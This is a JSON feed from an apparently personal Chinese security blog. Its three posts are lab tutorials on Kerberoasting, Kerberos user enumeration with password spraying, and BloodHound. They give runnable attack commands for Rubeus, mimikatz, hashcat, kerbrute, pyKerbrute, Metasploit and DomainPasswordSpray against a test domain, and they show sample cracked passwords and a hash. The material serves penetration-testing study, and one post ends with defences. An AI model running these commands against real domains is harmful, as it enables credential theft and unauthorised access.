{
    "version": "https://jsonfeed.org/version/1",
    "title": "云逸'bolg",
    "description": "",
    "home_page_url": "http://gyzero.shop",
    "items": [
        {
            "id": "http://gyzero.shop/2024/03/12/network-security/neiwang/Kerberoasting%E6%94%BB%E5%87%BB/Kerberoasting%E6%94%BB%E5%87%BB/",
            "url": "http://gyzero.shop/2024/03/12/network-security/neiwang/Kerberoasting%E6%94%BB%E5%87%BB/Kerberoasting%E6%94%BB%E5%87%BB/",
            "title": "Kerberoasting攻击",
            "date_published": "2024-03-12T10:38:16.000Z",
            "content_html": "<h3 id=\"spn\"><a class=\"markdownIt-Anchor\" href=\"#spn\">#</a> SPN</h3>\n<p>服务主体名称（Service Principal Name，简称 SPN）是服务实例的唯一标识符 Kerberos 身份验证使用 SPN 将服务实例与服务登录帐户相关联。这样，即使客户端没有帐户名称，客户端应用程序也能请求帐户的服务身份验证如果在计算机的整个目录林上安装多个服务实例，那么每个实例都必须有自己的 SPN</p>\n<p>就是服务实例注册到域控中的一个标识，域控用 SPN 来表示是那个服务，一个账户可以有多个 SPN 但是一个 SPN 只能有一个账户</p>\n<p>SPN 有两种，一是注册在 AD 上机器帐户 (Computers) 下，另一种注册在域用户帐户 (Users) 下。</p>\n<p>当一个服务的权限为 Local System 或 Network Service，则 SPN 注册在机器帐户 (Computers) 下。<br>\n当一个服务的权限为一个域用户，则 SPN 注册在域用户帐户 (Users) 下。</p>\n<pre><code class=\"language-cmd\">setspn -X 查询重复的SPN\nsetspn -Q */* 查看当前域内所有的SPN\nsetspn -T yunyi.io -Q */* 查看指定域内所有的SPN\nsetspn -D MSSQLvc/12server4.yunyi.io:1433 sqladmin 删除spn\nsetspn -A MSSQLvc/12server4.yunyi.io:1433 sqladmin 注册一个spn,在12server上为sqladmin用户注册SPN服务\n\nMSSQLvc/12server4.yunyi.io:1433是你要注册的SPN 1433是服务端口，sqladmin是启动SQL Server实例服务的帐户的名称\n</code></pre>\n<h3 id=\"kerberosast\"><a class=\"markdownIt-Anchor\" href=\"#kerberosast\">#</a> Kerberosast</h3>\n<p>Kerberosast 攻击利用了 TGS_REP 阶段在这个阶段 TGS 返回的 ST 是由服务账户 hash 加密的，我们获取到 ST 后如果服务账号密码简单</p>\n<p>并且使用 RC4-HMAC_MD5 加密因为这个加密比较容易爆破，我们就可以对 ST 穷举获取到服务账号的明文密码</p>\n<p>利用的过程为：</p>\n<p>第一步找到 SPN 服务</p>\n<p>第二步请求指定 SPN 的 ST 票据</p>\n<p>第四步导出 ST</p>\n<p>第五步爆破</p>\n<h3 id=\"发现spn\"><a class=\"markdownIt-Anchor\" href=\"#发现spn\">#</a> 发现 SPN</h3>\n<h4 id=\"riskyspn\"><a class=\"markdownIt-Anchor\" href=\"#riskyspn\">#</a> RiskySPN</h4>\n<p>这款工具可以发现弱密码易受攻击的 SPN，自动去除 krbtgt 用户的 SPN 服务因为这个用户因为当前用户密码是随机的不固定的 128 位字符不可能爆破出来</p>\n<figure class=\"highlight powershell\"><figcaption data-lang=\"PowerShell\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">Import-Module</span> <span class=\"token punctuation\">.</span>\\RiskySPNs<span class=\"token punctuation\">.</span>psm1 </pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">Find-PotentiallyCrackableAccounts</span> 搜索脆弱Spn找到脆弱的帐户</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">Export-PotentiallyCrackableAccounts</span> 产生全deatiled报告有关脆弱的帐户</pre></td></tr></table></figure><p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240314113846072.png\" alt=\"image-20240314113846072\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240314113916993.png\" alt=\"image-20240314113916993\"></p>\n<h4 id=\"kerberoast-getuserspns\"><a class=\"markdownIt-Anchor\" href=\"#kerberoast-getuserspns\">#</a> kerberoast-GetUserSPNs</h4>\n<p>kerberoast 工具集中的 GetUserSPNs.psl 和 GetUserSPNs.vbs 用于检测域中的 SPN</p>\n<figure class=\"highlight powershell\"><figcaption data-lang=\"PowerShell\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">Import-Module</span> <span class=\"token punctuation\">.</span>\\GetUserSPNs<span class=\"token punctuation\">.</span>ps1</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>cscript <span class=\"token punctuation\">.</span>\\GetUserSPNs<span class=\"token punctuation\">.</span>vbs</pre></td></tr></table></figure><p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240314113716199.png\" alt=\"image-20240314113716199\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240314114032106.png\" alt=\"image-20240314114032106\"></p>\n<h4 id=\"powerview\"><a class=\"markdownIt-Anchor\" href=\"#powerview\">#</a> PowerView</h4>\n<p>PowerSpolit 中的 PowerView.psl 脚本</p>\n<figure class=\"highlight powershell\"><figcaption data-lang=\"PowerShell\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">Import-Module</span> <span class=\"token punctuation\">.</span>\\PowerView<span class=\"token punctuation\">.</span>ps1</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">Get-NetUser</span> <span class=\"token operator\">-</span>SPN</pre></td></tr></table></figure><p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240314114307071.png\" alt=\"image-20240314114307071\"></p>\n<h3 id=\"请求spn\"><a class=\"markdownIt-Anchor\" href=\"#请求spn\">#</a> 请求 SPN</h3>\n<p>查询过滤完就该去请求有价值的 SPN 了</p>\n<h4 id=\"rubeus请求spn\"><a class=\"markdownIt-Anchor\" href=\"#rubeus请求spn\">#</a> Rubeus 请求 spn</h4>\n<pre><code class=\"language-cmd\">Rubeus.exe kerberoast请求注册域用户下所有SPN\nRubeus.exe kerberoast /format:john /outfile:hash.txt 请求后输出成hash\nRubeus.exe kerberoast /spn:MSSQLSvc/12servser4.yunyi.io:1433 /format:john /outfile:hash2.txt 请求指定的spn并输出\n</code></pre>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240314120835012.png\" alt=\"image-20240314120835012\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240314120745170.png\" alt=\"image-20240314120745170\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240314121407174.png\" alt=\"image-20240314121407174\"></p>\n<h4 id=\"mimikatz请求票据\"><a class=\"markdownIt-Anchor\" href=\"#mimikatz请求票据\">#</a> mimikatz 请求票据</h4>\n<p><code>kerberos::ask /target:MSSQLSvc/12servser4.yunyi.io:1433</code></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240314121800096.png\" alt=\"image-20240314121800096\"></p>\n<h4 id=\"powershell-命令请求\"><a class=\"markdownIt-Anchor\" href=\"#powershell-命令请求\">#</a> PowerShell 命令请求</h4>\n<figure class=\"highlight powershell\"><figcaption data-lang=\"PowerShell\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">Add-Type</span> <span class=\"token operator\">-</span>AssemblyName System<span class=\"token punctuation\">.</span>IdentityModel 请求服务票据</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>klist列出服务票据</pre></td></tr></table></figure><p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240314122815556.png\" alt=\"image-20240314122815556\"></p>\n<h3 id=\"导出票据\"><a class=\"markdownIt-Anchor\" href=\"#导出票据\">#</a> 导出票据</h3>\n<h4 id=\"mimikatz导出\"><a class=\"markdownIt-Anchor\" href=\"#mimikatz导出\">#</a> mimikatz 导出</h4>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240314124524750.png\" alt=\"image-20240314124524750\"></p>\n<p>Rubeus 导出</p>\n<p><code>Rubeus.exe kerberoast /format:john /outfile:hash.txt 请求后输出成has</code></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240314125002731.png\" alt=\"image-20240314125002731\"></p>\n<h3 id=\"破解票据\"><a class=\"markdownIt-Anchor\" href=\"#破解票据\">#</a> 破解票据</h3>\n<h4 id=\"hashcat破解\"><a class=\"markdownIt-Anchor\" href=\"#hashcat破解\">#</a> hashcat 破解</h4>\n<p>将刚才 Rubeus 导出的 hash 拿到本地进行离线爆破</p>\n<p><code>hashcat -m 13100 hash.txt pass.txt --force</code></p>\n<p><code>hashcat hash.txt --show</code></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240314130022282.png\" alt=\"image-20240314130022282\"></p>\n<h4 id=\"tgscrack\"><a class=\"markdownIt-Anchor\" href=\"#tgscrack\">#</a> tgscrack</h4>\n<p>先用 extractServiceTicketParts.py 脚本对 mimikatz 导出来的票据进行转换</p>\n<p><code>python2 extractServiceTicketParts.py MSSQLSvc\\~12servser4.yunyi.io\\~1433-YUNYI.IO.kirbi &gt; hash2.txt</code></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240314131328670.png\" alt=\"image-20240314131328670\"></p>\n<p>接着用 tgscrack.go 破解</p>\n<p><code>go run tgscrack.go -hashfile hash2.txt -wordlist pass.txt</code></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240314131029438.png\" alt=\"image-20240314131029438\"></p>\n<h4 id=\"kerberoastpy\"><a class=\"markdownIt-Anchor\" href=\"#kerberoastpy\">#</a> <span class=\"exturl\" data-url=\"aHR0cDovL2tlcmJlcm9hc3QucHk=\">kerberoast.py</span></h4>\n<p>kerberoast 工具集里的脚本</p>\n<p><code>https://github.com/nidem/kerberoast/blob/master/kerberoast.py</code></p>\n<p><code>python2 kerberoast.py pass.txt MSSQLSvc\\~12servser4.yunyi.io\\~1433-YUNYI.IO.kirbi</code></p>\n<h3 id=\"kerberosast防御\"><a class=\"markdownIt-Anchor\" href=\"#kerberosast防御\">#</a> Kerberosast 防御</h3>\n<p>设置高强度密码定期修改密码</p>\n<p>尽可能不要使用 RC4_HMAC 加密使用更安全的 AES256_HMAC 加密</p>\n<p>给服务账号的权限尽量不要太高</p>\n",
            "tags": []
        },
        {
            "id": "http://gyzero.shop/2024/03/09/network-security/neiwang/%E5%9F%9F%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92/%E5%9F%9F%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92/",
            "url": "http://gyzero.shop/2024/03/09/network-security/neiwang/%E5%9F%9F%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92/%E5%9F%9F%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92/",
            "title": "域用户枚举密码喷洒",
            "date_published": "2024-03-09T07:47:33.000Z",
            "content_html": "<p>什么是密码喷洒</p>\n<p><strong>密码喷洒</strong>（<strong>密码喷洒攻击</strong>）是指攻击者使用常见密码试图访问一个域上的多个帐户。攻击者可以使用常见弱密码列表（例如 “123456” 或 “password1”）在一次攻击中访问多个帐户，在我们获得一个域用户的密码时可以用这一个密码去尝试登陆其他账户</p>\n<p>其实就是内网信息收集后，用同一个密码去爆破不同的用户名，去碰撞。</p>\n<h3 id=\"用户枚举\"><a class=\"markdownIt-Anchor\" href=\"#用户枚举\">#</a> 用户枚举</h3>\n<p>做密码喷洒肯定是要先确定有哪些账号我们可以利用 Kerberos 错误代码进行判断</p>\n<p>抓取认证阶段的数据包分析</p>\n<p>图中 <code>cname</code>  为认证用户名</p>\n<p>在 AS-REQ 数据包中三种状态的错误代码分别为：</p>\n<pre><code class=\"language-undefined\">KDC_ERR_PREAUTH_REQUIRED-需要额外的预认证(启用)\nKDC_ERR_CLIENT_REVOKED-客户端凭证已被吊销(禁用)\nKDC_ERR_C_PRINCIPAL_UNKNOWN-在Kerberos数据库中找不到客户端\n</code></pre>\n<p>可以看到用户存在的为 KDC_ERR_PREAUTH_REQUIRED</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240310175010290.png\" alt=\"image-20240310175010290\"></p>\n<p>用户不存在的为 KDC_ERR_C_PRINCIPAL_UNKNOWN</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240310180102228.png\" alt=\"image-20240310180102228\"></p>\n<h4 id=\"kerbrute工具枚举\"><a class=\"markdownIt-Anchor\" href=\"#kerbrute工具枚举\">#</a> kerbrute 工具枚举</h4>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>kerbrute_windows_amd64.exe userenum <span class=\"token parameter variable\">--dc</span> <span class=\"token number\">10.10</span>.10.137 <span class=\"token parameter variable\">-d</span> yunyi.io user.txt</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>userenum 用户枚举模式</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">dc</span> 域控ip</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>d 域名</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>user.txt 指定的字典</pre></td></tr></table></figure><p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240310174119799.png\" alt=\"image-20240310174119799\"></p>\n<p>可看到图中有 test,yunyi,yunyi1,test1,test12 用户在真实环境中可以搜集各种当前环境的信息创建一个字典成功率更高</p>\n<h4 id=\"msf模块枚举\"><a class=\"markdownIt-Anchor\" href=\"#msf模块枚举\">#</a> msf 模块枚举</h4>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>use auxiliary/gather/kerberos_enumusers</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token builtin class-name\">set</span> domain yunyi.io 域名</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token builtin class-name\">set</span> rhosts <span class=\"token number\">10.10</span>.10.137 域控ip</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token builtin class-name\">set</span> user_file hc/user.txt 设置枚举用户字典</pre></td></tr></table></figure><p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240310204600469.png\" alt=\"image-20240310204600469\"></p>\n<p>枚举出五个用户</p>\n<h4 id=\"pykerbrute枚举\"><a class=\"markdownIt-Anchor\" href=\"#pykerbrute枚举\">#</a> pyKerbrute 枚举</h4>\n<pre><code class=\"language-cmd\">EnumADUser.py &lt;域控制地址&gt; &lt;域名称&gt; &lt;文件&gt; &lt;模式&gt;\npython2 EnumADUser.py 10.10.10.137 yunyi.io user.txt tcp\npython2 EnumADUser.py 10.10.10.137 yunyi.io user.txt udp模式也可以\n</code></pre>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240310233742455.png\" alt=\"\"></p>\n<h3 id=\"密码喷洒\"><a class=\"markdownIt-Anchor\" href=\"#密码喷洒\">#</a> 密码喷洒</h3>\n<p>枚举出了用户就该尝试登陆了，针对一个用户用不同密码爆破因为管理员可能会设置锁定，为了防止账号被锁可以用单个密码去登陆多个账户</p>\n<h4 id=\"kerbrute\"><a class=\"markdownIt-Anchor\" href=\"#kerbrute\">#</a> kerbrute</h4>\n<pre><code class=\"language-cmd\">kerbrute_windows_amd64.exe passwordspray --dc 10.10.10.137 -d yunyi.io user.txt 123456\nkerbrute_windows_amd64.exe passwordspray --dc 10.10.10.137 -d yunyi.io user.txt YUNyi123\n--dc 域控IP\n-d 域名\npasswordspray 密码喷洒模式\n12346 YUNyi123密码\nuser.txt 存在的域用户名\n</code></pre>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240310205801736.png\" alt=\"image-20240310205801736\"></p>\n<p>可见枚举出 test yunyi1 账号的密码为 123456</p>\n<p>test yunyi test1 为 YUNyi123</p>\n<p>有时管理员也可能会设置为不锁定账户这时也可以进行单个账户爆破密码</p>\n<p><code>kerbrute_windows_amd64.exe bruteuser --dc 10.10.10.137 -d yunyi.io pass.txt test</code></p>\n<p>pass.txt 为密码字典 账号 test</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240310210616793.png\" alt=\"image-20240310210616793\"></p>\n<p>抓包分析</p>\n<p>第一张图 test12ASREQ 包</p>\n<p>第二张 test12ASREP 包</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240310211333982.png\" alt=\"image-20240310211333982\"></p>\n<p>账号存在密码正确返回</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240310211419532.png\" alt=\"image-20240310211419532\"></p>\n<p>错误的返回包</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240310212005332.png\" alt=\"image-20240310212005332\"></p>\n<h4 id=\"pykerbrute\"><a class=\"markdownIt-Anchor\" href=\"#pykerbrute\">#</a> pyKerbrute</h4>\n<p><code>https://github.com/3gstudent/pyKerbrute</code></p>\n<pre><code class=\"language-cmd\">ADPwdSpray.py &lt;域控制地址&gt; &lt;域名称&gt; &lt;文件&gt; &lt;密码类型&gt; &lt;数据&gt; &lt;模式&gt;\npython2 ADPwdSpray.py 10.10.10.137 yunyi.io user.txt clearpassword YUNyi123 tcp\npython2 ADPwdSpray.py 10.10.10.137 yunyi.io user.txt clearpassword 123456 tcp\npython2 ADPwdSpray.py 10.10.10.137 yunyi.io user.txt ntlmhash 161cff084477fe596a5db81874498a24 tcp hash也是可以的\n</code></pre>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240310232927815.png\" alt=\"image-20240310232927815\"></p>\n<h4 id=\"domainpasswordspraypsl\"><a class=\"markdownIt-Anchor\" href=\"#domainpasswordspraypsl\">#</a> DomainPasswordSpray…psl</h4>\n<p>DomainPasswordSpray…psl 也可以进行密码喷洒攻击，该 PowerShell 脚本需要在域内机器上执行，默认情况下该脚本是利用 LDAP 从域中导出用户列表，去除被锁定的用户，用指定的密码进行喷洒。</p>\n<figure class=\"highlight powershell\"><figcaption data-lang=\"PowerShell\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">Import-Module</span> <span class=\"token punctuation\">.</span>\\DomainPasswordSpray<span class=\"token punctuation\">.</span>ps1</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">Invoke-DomainPasswordSpray</span> <span class=\"token operator\">-</span>Password 123456</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">Invoke-DomainPasswordSpray</span> <span class=\"token operator\">-</span>Password YUNyi123</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">Invoke-DomainPasswordSpray</span> <span class=\"token operator\">-</span>Userlist user<span class=\"token punctuation\">.</span>txt <span class=\"token operator\">-</span>Domain yunyi<span class=\"token punctuation\">.</span>io <span class=\"token operator\">-</span>password 123456 指定用户列表</pre></td></tr></table></figure><p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240310235821942.png\" alt=\"image-20240310235821942\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240310235838927.png\" alt=\"image-20240310235838927\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240310235854193.png\" alt=\"image-20240310235854193\"></p>\n",
            "tags": []
        },
        {
            "id": "http://gyzero.shop/2024/03/08/network-security/neiwang/BloodHound%E5%B7%A5%E5%85%B7/BloodHound%E5%B7%A5%E5%85%B7/",
            "url": "http://gyzero.shop/2024/03/08/network-security/neiwang/BloodHound%E5%B7%A5%E5%85%B7/BloodHound%E5%B7%A5%E5%85%B7/",
            "title": "BloodHound工具",
            "date_published": "2024-03-08T08:46:43.000Z",
            "content_html": "<p><strong>BloodHound</strong> 是一个基于单页 JavaScript 网页应用程序，构建在 Linkurious 之上，使用 Electron 编译，由 C# 数据收集器提供数据给 Neo4j 数据库。它利用图论来揭示 Active Directory 或 Azure 环境中隐藏且常常无意的关系</p>\n<p>攻击者可以使用 <strong>BloodHound</strong> 轻松识别复杂的攻击路径，这些路径在其他情况下很难快速识别。防御者也可以使用 <strong>BloodHound</strong> 来识别并消除这些攻击路径。无论是蓝队还是红队，都可以使用 <strong>BloodHound</strong> 更深入地了解 Active Directory 或 Azure 环境中的权限关系</p>\n<h3 id=\"neo4j-数据库\"><a class=\"markdownIt-Anchor\" href=\"#neo4j-数据库\">#</a> Neo4j 数据库</h3>\n<p><code>apt-get install neo4j</code></p>\n<p>安装成功后启动</p>\n<p><code>neo4j start</code></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240308172653141.png\" alt=\"image-20240308172653141\"></p>\n<p>浏览器访问</p>\n<pre><code>Host : http://localhost:7474\nUsername : neo4j\nPassword : neo4j\n</code></pre>\n<h3 id=\"安装bloodhound\"><a class=\"markdownIt-Anchor\" href=\"#安装bloodhound\">#</a> 安装 BloodHound</h3>\n<p><code>https://github.com/BloodHoundAD/BloodHound/releases</code></p>\n<p>安装完成后到目录下执行 <code>./BloodHound --no-sandbox</code></p>\n<p>输入 neo4j 设置的账号密码就可以进来了</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240308173248743.png\" alt=\"image-20240308173248743\"></p>\n<h3 id=\"数据收集\"><a class=\"markdownIt-Anchor\" href=\"#数据收集\">#</a> 数据收集</h3>\n<p>BloodHound 有；两个版本采集工具</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240308173703965.png\" alt=\"image-20240308173703965\"></p>\n<p>SharpHound 是官方的数据收集器，用于 BloodHound。 这是写的 C# 和使用本地 Windows API 职能和 LDAP 名字空间的功能 收集的数据域控制器和加入域的 windows 系统。</p>\n<p>SharpHound 将自动确定什么领域当前用户 属于，找到一个域控制器，用于这一领域，并启动 &quot;默认&quot; 收集方法。 默认的收集方法将会收集的 下列信息域控制器：</p>\n<ul>\n<li>安全组成员身份</li>\n<li>域信任</li>\n<li>Abusable 权利上的活动目录的对象</li>\n<li>小组政策的链接</li>\n<li>OU 树形结构</li>\n<li>几个属性，从计算机、小组和用户的对象</li>\n<li>SQL 管理的链接</li>\n</ul>\n<p>此外，SharpHound 将尝试收集以下信息 从各个领域加入了 windows 计算机：</p>\n<ul>\n<li>成员的地方管理程序，分布 COM 和远程管理组</li>\n<li>活动的会议，其 SharpHound 将尝试相互关联的系统 用户交互式登录在</li>\n</ul>\n<p>当完成后，SharpHound 会创建这些类文件和将它们放入 一个压缩文件</p>\n<p>基本的使用</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>SharpHound.exe <span class=\"token parameter variable\">-c</span> all</pre></td></tr></table></figure><p>执行完毕后会生成一个 zip 文件</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240308175014319.png\" alt=\"image-20240308175014319\"></p>\n<p>把这个文件导入到 BloodHound，把 zip 文件复制到 kali 点击 upload data</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240308175229654.png\" alt=\"image-20240308175229654\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240308175146642.png\" alt=\"image-20240308175146642\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240308181338898.png\" alt=\"image-20240308181338898\"></p>\n<p>这里三个模块分别是<br>\n 1 、 Database Info （数据库信息），可以查看当前数据库中的域用户、域计算机等统计信息。<br>\n2 、 Node Indo （节点信息），单击某个节点时，在这里可以看到对应节点的相关信息。<br>\n3 、 Analysis （分析查询），在 BloodHound 中预设了一些查询条件，具体如下：</p>\n<p>右键节点分别是</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240308181635837.png\" alt=\"image-20240308181635837\"></p>\n<p>设置为起始节点。<br>\n设置为结束节点。<br>\n到这里的最短路径。<br>\n从拥有的到这里的最短路径。<br>\n编辑节点。<br>\n将组标记为拥有。<br>\n将集团标记为高价值。<br>\n删除节点</p>\n<p>Analysis 这里有一些预设好的查询</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240308182140085.png\" alt=\"image-20240308182140085\"></p>\n<p>预构建的分析查询。<br>\n域信息。<br>\n查找所有域管理员。<br>\n映射域信任。<br>\n查找安装了不支持的操作系统的计算机。<br>\n危险的特权。<br>\n查找具有 DCSync 权限的主体。<br>\n具有外部域组成员身份的用户。<br>\n具有外部域组成员资格的组。<br>\n查找域用户为本地管理员的计算机。<br>\n查找域用户可以读取 LAPS 密码的计算机。<br>\n查找从域用户到高价值目标的所有路径。<br>\n查找域用户可以进行 RDP 的工作站。<br>\n查找域用户可以进行 RDP 的服务器。<br>\n查找域用户组的危险权限。<br>\n查找非域控制器的域管理员登录。<br>\nKerberos 交互。<br>\n查找高价值组的 Kerberoastable 成员。<br>\n列出所有 Kerberoastable 帐户。<br>\n查找具有最大权限的 Kerberoastable 用户。<br>\n查找 AS-REP 可烘焙用户 (DontReqPreAuth)。<br>\n最短路径。<br>\n到无约束委托系统的最短路径。<br>\n来自 Kerberoastable 用户的最短路径。<br>\n从 Kerberoastable 用户到域管理员的最短路径。<br>\n自拥有的校长的最短路径。<br>\n从拥有的主体到域管理员的最短路径。<br>\n通向高价值目标的最短路径。<br>\n从域用户到高价值目标的最短路径。<br>\n查找通向域管理员的最短路径</p>\n<p>官方文档</p>\n<p><code>https://bloodhound.readthedocs.io/en/latest/further-reading/further-reading.html</code></p>\n",
            "tags": []
        },
        {
            "id": "http://gyzero.shop/2024/03/07/network-security/neiwang/Token%E7%AA%83%E5%8F%96%E5%88%A9%E7%94%A8/Token%E7%AA%83%E5%8F%96%E5%88%A9%E7%94%A8/",
            "url": "http://gyzero.shop/2024/03/07/network-security/neiwang/Token%E7%AA%83%E5%8F%96%E5%88%A9%E7%94%A8/Token%E7%AA%83%E5%8F%96%E5%88%A9%E7%94%A8/",
            "title": "Token窃取利用",
            "date_published": "2024-03-07T11:56:32.000Z",
